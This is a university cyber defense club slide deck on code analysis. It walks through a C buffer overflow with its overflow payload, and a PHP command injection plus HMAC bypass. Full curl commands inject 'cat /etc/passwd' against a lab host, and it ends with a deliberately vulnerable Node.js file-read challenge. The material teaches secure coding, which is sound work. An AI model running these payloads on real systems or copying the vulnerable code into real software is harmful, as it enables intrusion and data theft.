@@ -1,0 +1,458 @@
+#+TITLE: LUCDC: Code Analysis
+#+OPTIONS: toc:nil
+#+AUTHOR: Andrew Rioux
+#+EMAIL: arioux@liberty.edu
+#+REVEAL_ROOT: https://cdn.jsdelivr.net/npm/reveal.js
+#+REVEAL_PLUGINS: (notes)
+#+REVEAL_DEFAULT_SLIDE_BACKGROUND: ../common/background.png
+#+REVEAL_EXTRA_CSS: ../common/theme.css
+#+REVEAL_INIT_OPTIONS: transition: 'none'
+#+REVEAL_TITLE_SLIDE_BACKGROUND: ../common/background.png
+#+REVEAL_TITLE_SLIDE: <h1>%t</h1>
+#+REVEAL_TITLE_SLIDE: %a (%e)
+
+* About me
+#+ATTR_REVEAL: :frag (appear appear appear appear)
+- Andrew Rioux
+- CS: Software Engineering (Sophomore)
+- Software Engineer for US Navy
+- LU CDC Vice President
+* Presentation information
+** Located at the following git repository
+[[https://github.com/r-a303931/lucdc-presentations]]
+
+** Example 1
+- Build: ~docker-compose run example1_build~ (or ~make~ in [[./example1]])
+- Run: ~docker-compose run example1~
+
+** Example 2
+- Start web server: ~docker-compose up example2~
+
+* Life Goals
+What do you plan to do after graduation?
+#+ATTR_REVEAL: :frag appear
+- Penetration testing?
+- Security engineer?
+- Software Engineer / Programmer?
+
+* What are you going to deal with in your day to day job?
+#+ATTR_REVEAL: :frag appear
+Code!
+
+* What we will be going over here
+#+ATTR_REVEAL: :frag (appear appear appear appear appear)
+- Example 1: Too simple with no safety (C)
+- Example 2: Too complex with fake safety (PHP)
+- What can we learn?
+- Club exercise (JS)!
+
+* Example 1: Too simple with no safety
+** Source code:
+#+BEGIN_SRC c
+#include <stdio.h>
+// It's a surprise tool that will help us later...
+void shell() {
+    printf("Suspicious function here...\n");
+}
+void get_name() {
+    printf("What is your name?\n");
+    char buffer[20];
+    scanf("%s", buffer);
+    printf("Hello, %s!\n", buffer);
+}
+int main() {
+    get_name();
+}
+#+END_SRC
+
+** How is this compiled?
+#+BEGIN_SRC makefile
+example1: example1.c
+	gcc -no-pie --no-stack-protector -o example1 example1.c
+#+END_SRC
+
+** Options of interest
+#+ATTR_REVEAL: :frag appear
+- ~-no-pie~
+#+ATTR_REVEAL: :frag appear
+- ~--no-stack-protector~
+
+** We know ~shell~ is bad
+But it's benign....
+#+ATTR_REVEAL: :frag appear
+right?
+
+** Nope!
+What if your name is ~AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x0\x0\x0\x0\x0~?
+
+** What happened?
+#+ATTR_REVEAL: :frag appear
+Buffer overflow exploit!
+
+** What could happen?
+* Example 2: Too complex with fake safety
+PHP has some magic variable management
+#+ATTR_REVEAL: :frag appear
+...can this be taken advantage of?
+
+** Aside: How HTTP works
+#+ATTR_REVEAL: :frag appear
+You make a request, and get a response
+
+*** Get me a file, please!
+*** Post to this location and do a thing!
+*** How do we handle that in PHP?
+#+ATTR_REVEAL: :frag (appear appear)
+- ~$_GET~
+- ~$_POST~
+** Aside: PHP in 5 seconds for C++ programmers
+#+ATTR_REVEAL: :frag appear
+Every variable begins with ~$~
+
+#+ATTR_REVEAL: :frag appear
+Every PHP file begins with ~<?php~
+
+#+ATTR_REVEAL: :frag appear
+No main function, everything just happens in the order it's displayed
+
+#+ATTR_REVEAL: :frag appear
+Other than that, basically C++!
+** Source code: Input check
+#+BEGIN_SRC php
+<?php
+    if (empty($_POST['hmac']) || empty($_POST['host'])) {
+        header('HTTP/1.0 400 Bad Request');
+        exit;
+    }
+#+END_SRC
+
+** Source code: Authentication and execution
+#+BEGIN_SRC php
+    $secret = getenv("SECRET");
+
+    if (isset($_POST['nonce']))
+        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
+
+    $hmac = hash_hmac('sha256', $_POST['host'], $secret);
+
+    if ($hmac !== $_POST['hmac']) {
+        header('HTTP/1.0 403 Forbidden');
+        exit;
+    }
+
+    echo passthru("host ".$_POST['host']);
+#+END_SRC
+
+** Step 0: Identify host
+#+ATTR_REVEAL: :frag appear
+10.104.58.39
+
+#+ATTR_REVEAL: :frag appear
+Join in! [[http://10.104.58.39/ui.php]]
+
+** Step 1: Normal Usage
+#+ATTR_REVEAL: :frag fade-in-and-out
+What's "normal"?
+
+*** Usage 1:
+- host: ~google.com~
+- hmac: ~ad1663b82d5bdb2e1938...~
+
+*** Usage 2:
+- host: ~google.com~
+- nonce: ~STUPID_NONCE~
+- hmac: ~b3700dedb181ee312930...~
+
+*** Command
+#+BEGIN_NOTES
+Execute command below:
+
+[[shell:curl --data "host=google.com&hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 127.0.0.1]]
+#+END_NOTES
+
+#+BEGIN_SRC bash
+curl --data "host=google.com&hmac=ad1663b82d5bdb2e1938c368f627593f836f81bcee055f8e427b70ff2cadfa64" 10.104.58.39
+#+END_SRC
+
+** What functions are being called and variables used?
+#+BEGIN_SRC php
+    $secret = getenv("SECRET");
+
+    if (isset($_POST['nonce']))
+        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
+
+    $hmac = hash_hmac('sha256', $_POST['host'], $secret);
+
+    if ($hmac !== $_POST['hmac']) {
+        header('HTTP/1.0 403 Forbidden');
+        exit;
+    }
+
+    echo passthru("host ".$_POST['host']);
+#+END_SRC
+
+#+ATTR_REVEAL: :frag (appear appear appear appear appear appear)
+- [[https://www.php.net/manual/en/function.getenv.php][~getenv~]]
+- [[https://www.php.net/manual/en/function.isset.php][~isset~]]
+- [[https://www.php.net/manual/en/reserved.variables.post.php][~$_POST~]]
+- [[https://www.php.net/manual/en/function.hash-hmac.php][~hash_hmac~]]
+- [[https://www.php.net/manual/en/function.header.php][~header~]]
+- [[https://www.php.net/manual/en/function.passthru.php][~passthru~]]
+
+** Step 2: Bash Injection
+Is ~passthru~ vulnerable to shell injections?
+#+ATTR_REVEAL: :frag appear
+Yes!
+
+*** Example usage:
+- host: ~google.com;cat /etc/passwd~
+- hmac: ~84e26d8e32086e127a60...~
+
+*** Command
+#+BEGIN_NOTES
+Execute command below:
+
+[[shell:curl --data "host=google.com;cat /etc/passwd&hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 127.0.0.1]]
+#+END_NOTES
+
+#+BEGIN_SRC bash
+curl --data "host=google.com;cat /etc/passwd&hmac=84e26d8e32086e127a60626d14fd565fd25bef5aa896d22878d42051f1b28417" 10.104.58.39
+#+END_SRC
+
+** Step 3: HMAC Circumvention
+What else is vulnerable in the code above?
+#+ATTR_REVEAL: :frag appear
+Is there anything magic that happens, a "feature"?
+
+*** Did you catch it?
+#+ATTR_REVEAL: :frag appear
+"One feature of PHP's processing of POST and GET variables is that it automatically decodes indexed form variable names."
+
+#+ATTR_REVEAL: :frag appear
+What does this do to the types of variables used?
+
+*** Some PHP analysis
+#+ATTR_REVEAL: :frag appear
+- ~element[]~: 1
+- ~element[]~: 2
+
+#+ATTR_REVEAL: :frag appear
+#+BEGIN_SRC php
+<?php
+    var_dump($_POST);
+
+    // array(1) {
+    //     ["element"] => array(2) {
+    //         [0] => string(1) "1"
+    //         [1] => string(2) "2"
+    //     }
+    // }
+#+END_SRC
+
+*** What are the arguments this bit of code expects?
+#+BEGIN_SRC php
+    $secret = getenv("SECRET");
+
+    if (isset($_POST['nonce']))
+        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
+
+    $hmac = hash_hmac('sha256', $_POST['host'], $secret);
+
+    if ($hmac !== $_POST['hmac']) {
+        header('HTTP/1.0 403 Forbidden');
+        exit;
+    }
+
+    echo passthru("host ".$_POST['host']);
+#+END_SRC
+
+#+ATTR_REVEAL: :frag appear
+What can we change?
+
+#+ATTR_REVEAL: :frag (appear appear appear)
+- ~hmac~
+- ~host~
+- ~nonce~
+
+*** What happens to ~hash_hmac~ when we change ~$_POST['nonce']~ to an array?
+#+ATTR_REVEAL: :frag appear
+Let's see!
+
+*** Commands
+#+BEGIN_NOTES
+[[shell:docker run -it php:7.4-apache-buster php -a]]
+#+END_NOTES
+
+#+BEGIN_SRC php
+$test_value = ['1','2'];
+var_dump(hash_hmac('sha256', $test_value, 'dummy'));
+#+END_SRC
+
+#+ATTR_REVEAL: :frag appear
+#+BEGIN_SRC php
+var_dump(hash_hmac('sha256', 'a string', NULL));
+#+END_SRC
+
+*** It works!
+#+ATTR_REVEAL: :frag appear
+Now what?
+
+*** Look at the source code again...
+#+BEGIN_SRC php
+    $secret = getenv("SECRET");
+
+    if (isset($_POST['nonce']))
+        $secret = hash_hmac('sha256', $_POST['nonce'], $secret);
+
+    $hmac = hash_hmac('sha256', $_POST['host'], $secret);
+
+    if ($hmac !== $_POST['hmac']) {
+        header('HTTP/1.0 403 Forbidden');
+        exit;
+    }
+
+    echo passthru("host ".$_POST['host']);
+#+END_SRC
+
+*** Resulting query
+#+ATTR_REVEAL: :frag (appear appear appear appear)
+- host: ~google.com;cat /etc/passwd~
+- hmac: ~bbf36c444a323aca2808...~
+- nonce[]: 1
+- nonce[]: 2
+
+*** Command
+#+BEGIN_SRC bash
+curl --data "nonce[]=1&nonce[]=2&host=google.com;cat /etc/passwd&hmac=bbf36c444a323aca2808e486ea2165ff76d6f671e5dee9987007dba448230a53" 10.104.58.39
+#+END_SRC
+* What can we learn from both examples?
+** Assume there is a problem
+#+ATTR_REVEAL: :frag appear
+It makes it easier to recover when there is one
+
+** Do not trust users!
+#+ATTR_REVEAL: :frag appear
+Limit user input and verify it is the right format and type
+
+** Do not trust your programming language!
+#+ATTR_REVEAL: :frag appear
+Learn the ins and outs of whatever language you are using
+
+#+ATTR_REVEAL: :frag appear
+Find a place to listen to news about your language of choice
+
+* How can we secure Example 1?
+** Don't provide the option to overflow the buffer: fgets(3)
+** Compare the following
+#+ATTR_REVEAL: :frag appear
+#+BEGIN_SRC c
+int scanf(const char format, ...);
+int fscanf(FILE strict stream, const char format, ...);
+#+END_SRC
+
+#+ATTR_REVEAL: :frag appear
+#+BEGIN_SRC c
+char *fgets(char *s, int size, FILE *stream);
+#+END_SRC
+
+#+ATTR_REVEAL: :frag appear
+What's the main difference?
+
+** Where can you find vulnerabilities and alternatives like this?
+#+ATTR_REVEAL: :frag appear
+DuckDuckGo and Reddit
+
+* How can we secure Example 2?
+** Do not trust the types of your variables in weakly typed languages!
+For PHP: [[https://www.php.net/manual/en/ref.var.php]]
+** Enable strict error handling
+Set strict error reporting level: [[https://www.php.net/manual/en/function.error-reporting.php]]
+
+#+ATTR_REVEAL: :frag appear
+#+BEGIN_SRC php
+error_reporting(E_ALL | E_STRICT);
+#+END_SRC
+
+** Understand the change of types of variables
+* What can you do to code that isn't yours?
+#+BEGIN_NOTES
+Include mention of DMs
+#+END_NOTES
+
+#+ATTR_REVEAL: :frag appear
+Depends on the owner's code and policies
+
+#+ATTR_REVEAL: :frag appear
+Google Bug Bounty program: [[https://bughunters.google.com/about/rules/6625378258649088]]
+* Wasn't this whole presentation just reverse engineering?
+#+ATTR_REVEAL: :frag appear
+Maybe...
+
+#+ATTR_REVEAL: :frag appear
+We need to know how to fix problems, not just identify and exploit them!
+
+* Club exercise!
+** Situation description
+#+ATTR_REVEAL: :frag appear
+You are given a Node.js 16 server which provides user data
+
+#+ATTR_REVEAL: :frag appear
+There is a ~/users~ folder which in turn has folders which contain user files
+
+#+ATTR_REVEAL: :frag appear
+The server has to take the following parameters:
+
+#+ATTR_REVEAL: :frag appear
+- userId (required): A user ID number
+- file (optional): The file to pull. Defaults to user.json
+
+** Challenge code
+#+BEGIN_SRC js
+// Node.js 16
+const fs   = require('node:fs');
+const http = require('node:http');
+const Url  = require('node:url');
+const path = require('node:path');
+
+const server = http.createServer((req, res) => {
+    if (req.url.startsWith('/user/')) {
+        const url = new Url.URL(`http://${req.headers.host}${req.url}`);
+
+        if (url.searchParams.get('userId') && !isNaN(parseInt(url.searchParams.get('userId')))) {
+            // Each user has a folder, go into that folder and get their user.json file
+            // and return the text
+            const id = url.searchParams.get('userId');
+            const userFile = url.searchParams.get('file') ?? 'user.json';
+
+            const filePath = path.resolve('/users', id, userFile);
+
+            fs.readFile(filePath, (err, text) => {
+                if (err) throw err;
+
+                res.write(text.toString());
+                res.end();
+            });
+        } else {
+            res.statusCode = 400;
+            res.end();
+        }
+    } else {
+        res.statusCode = 404;
+        res.end();
+    }
+});
+
+server.listen(8000);
+#+END_SRC
+
+** Code is located in same GitHub repository
+#+ATTR_REVEAL: :frag appear
+[[https://github.com/r-a303931/lucdc-presentations]]
+
+#+ATTR_REVEAL: :frag appear
+~2022-02-03/challenges/challenge.js~
+
+** Your challenge:
+Come up with a fix!
+
+Message me your fix in Discord (Andrew#3967)
